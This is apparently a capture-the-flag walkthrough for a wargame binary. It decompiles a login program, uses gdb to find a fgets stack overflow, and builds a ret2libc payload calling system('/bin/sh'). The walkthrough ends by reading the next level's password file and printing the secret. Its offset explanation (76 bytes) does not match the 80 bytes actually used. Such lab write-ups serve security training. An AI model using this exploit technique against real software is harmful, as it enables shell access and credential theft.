## Step 1: Static & Dynamic Analysis

```c
08048464    int32_t verify_user_name()
08048464    {
08048464        int32_t __saved_esi;
08048469        bool c = &__saved_esi < 0x10;
08048469        bool z = &__saved_esi == 0x10;
08048473        puts("verifying username....\n");
08048482        int32_t i = 7;
08048487        void* esi = &a_user_name;
08048489        void* const edi = "dat_wil";
08048489        
0804848b        while (i)
0804848b        {
0804848b            char temp1_1 = *(uint8_t*)esi;
0804848b            char temp2_1 = *(uint8_t*)edi;
0804848b            c = temp1_1 < temp2_1;
0804848b            z = temp1_1 == temp2_1;
0804848b            esi += 1;
0804848b            edi += 1;
0804848b            i -= 1;
0804848b            
0804848b            if (!z)
0804848b                break;
0804848b        }
0804848b        
080484a2        return (int32_t)((!z && !c) - c);
08048464    }

080484a3    int32_t verify_user_pass(char* arg1)
080484a3    {
080484a3        int32_t i = 5;
080484b7        char* esi = arg1;
080484b9        void* const edi = "admin";
080484bb        bool c;
080484bb        bool z;
080484bb        
080484bb        while (i)
080484bb        {
080484bb            char temp0_1 = *(uint8_t*)esi;
080484bb            char temp1_1 = *(uint8_t*)edi;
080484bb            c = temp0_1 < temp1_1;
080484bb            z = temp0_1 == temp1_1;
080484bb            esi = &esi[1];
080484bb            edi += 1;
080484bb            i -= 1;
080484bb            
080484bb            if (!z)
080484bb                break;
080484bb        }
080484bb        
080484bd        char* edx;
080484bd        edx = !z && !c;
080484cf        return (int32_t)(edx - c);
080484a3    }

080484d0    int32_t main(int32_t argc, char** argv, char** envp)
080484d0    {
080484d0        void buffer;
080484ed        __builtin_memset(&buffer, 0, 64);
080484ef        int32_t var_14 = 0;
080484fe        puts("********* ADMIN LOGIN PROMPT ***…");
0804850b        printf("Enter Username: ");
08048528        fgets(&a_user_name, 256, stdin);
08048528        
0804853b        if (verify_user_name())
0804853b        {
08048557            puts("nope, incorrect username...\n");
08048549            return 1;
0804853b        }
0804853b        
08048557        puts("Enter Password: ");
08048574        fgets(&buffer, 100, stdin);
08048580        int32_t eax_2 = verify_user_pass(&buffer);
08048580        
08048595        if (eax_2 && !eax_2)
080485aa            return 0;
080485aa        
0804859e        puts("nope, incorrect password...\n");
080485a3        return 1;
080484d0    }

```

### Explanation

The program contains three functions: `verify_user_name`, `verify_user_pass`, and `main`. It validates a hardcoded username (`dat_wil`) and password (`admin`) before exit.
The main function interacts with the user to get input for the username and password. It uses `fgets()` to read input into buffers but does not choose a correct `size`, the size specified is `100` and the size of the buffer is only `64`, making it vulnerable to a buffer overflow.

```
Enter Password:                                                                                                                               
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6A
e7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag                                                                                    
                                                                                                                                              
Breakpoint 5, 0x08048585 in main ()                                                                                                           
(gdb) x/100wx $esp                                                                                                                            
0xffffdbc0:     0xffffdbdc      0x00000064      0xf7fcfac0      0x00000001                                                                    
0xffffdbd0:     0xffffdde5      0x0000002f      0xffffdc2c      0x41306141                                                                    
0xffffdbe0:     0x61413161      0x33614132      0x41346141      0x61413561                                                                    
0xffffdbf0:     0x37614136      0x41386141      0x62413961      0x31624130                                                                    
0xffffdc00:     0x41326241      0x62413362      0x35624134      0x41366241                                                                    
0xffffdc10:     0x62413762      0x39624138      0x41306341      0x63413163                                                                    
0xffffdc20:     0x33634132      0x41346341      0x63413563      0x37634136                                                                    
0xffffdc30:     0x41386341      0x64413963      0x31644130      0x00326441                                                                    
0xffffdc40:     0x00000000      0xffffdc1c      0xffffdccc      0x00000000                                                                    
0xffffdc50:     0x08048250      0xf7fceff4      0x00000000      0x00000000                                                                    
0xffffdc60:     0x00000000      0x649e586a      0x538f9c7a      0x00000000                                                                    
0xffffdc70:     0x00000000      0x00000000      0x00000001      0x080483b0                                                                    
0xffffdc80:     0x00000000      0xf7ff0a50      0xf7e45429      0xf7ffcff4                                                                    
0xffffdc90:     0x00000001      0x080483b0      0x00000000      0x080483d1                                                                    
0xffffdca0:     0x080484d0      0x00000001      0xffffdcc4      0x080485c0                                                                    
0xffffdcb0:     0x08048630      0xf7feb620      0xffffdcbc      0xf7ffd918                                                                    
0xffffdcc0:     0x00000001      0xffffdde5      0x00000000      0xffffde01                                                                    
0xffffdcd0:     0xffffde11      0xffffde24      0xffffde47      0xffffde5a                                                                    
0xffffdce0:     0xffffde67      0xffffde72      0xffffde7e      0xffffdecb                                                                    
0xffffdcf0:     0xffffdee2      0xffffdef1      0xffffdf09      0xffffdf1a                                                                    
0xffffdd00:     0xffffdf23      0xffffdf3c      0xffffdf44      0xffffdf56                                                                    
0xffffdd10:     0xffffdf66      0xffffdf9a      0xffffdfba      0x00000000                                                                    
0xffffdd20:     0x00000020      0xf7fdb430      0x00000021      0xf7fdb000                                                                    
0xffffdd30:     0x00000010      0x178bfbff      0x00000006      0x00001000                                                                    
0xffffdd40:     0x00000011      0x00000064      0x00000003      0x08048034

(gdb) c                                                                                                                                       
Continuing.
nope, incorrect password...

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

By analyzing the crash address `0x37634136`, we determine that the overflow occurs when the buffer exceeds the `76` bytes, and the `4` next bytes is used as the return address.
With all theses information we know that we can do a `ret2libc` attack.

```
(gdb) info func system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
(gdb)
```

```
(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec
1 pattern found.
(gdb)
```

The `system()` address and the address of the `/bin/sh` string in memory are located at `0xf7e6aed0` and `0xf7f897ec`.

## Step 2: Exploiting the Binary

```bash
level01@OverRide:~$ python -c 'print("dat_wil")' > /tmp/exploit
level01@OverRide:~$ python -c 'print(("A" * 80) + "\xf7\xe6\xae\xd0"[::-1] + "BBBB" + "\xf7\xf8\x97\xec"[::-1])' >> /tmp/exploit
level01@OverRide:~$ cat /tmp/exploit - | ./level01

% cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
